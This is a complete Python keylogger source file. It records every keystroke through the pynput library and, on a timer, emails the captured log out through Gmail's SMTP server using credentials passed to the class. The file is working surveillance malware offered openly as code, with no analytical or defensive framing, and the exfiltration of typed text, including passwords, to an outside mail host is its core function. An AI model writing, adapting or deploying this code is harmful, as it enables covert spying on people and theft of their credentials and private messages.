#!/usr/bin/env python
import pynput.keyboard, threading , smtplib


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = " Keylogger started "
        self.time_interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):

        try:
            currentkey = str(key.char)

        except AttributeError:
            if key == key.space:
                currentkey = " "
            else:
                currentkey = " " + str(key) + " "
        self.append_to_log(currentkey)

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):

        self.send_mail(self.email, self.password,"\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.time_interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
